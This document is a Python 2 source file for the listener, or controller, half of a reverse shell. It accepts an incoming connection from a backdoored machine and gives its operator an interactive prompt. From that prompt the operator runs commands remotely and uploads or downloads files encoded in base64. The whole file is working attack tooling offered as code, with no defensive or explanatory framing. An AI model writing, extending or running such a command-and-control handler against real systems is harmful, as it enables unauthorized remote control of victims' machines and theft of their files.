#!/usr/bin/env python

import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        local = ""
        if ip == "127.0.0.1":
            local = "'loop_back' "
        print("[+] Waiting for " + local + "incoming connections.")
        self.connection, address = self.listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        self.connection.send(json.dumps(data))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1380)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.listener.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error, during command execution."
            print(result)
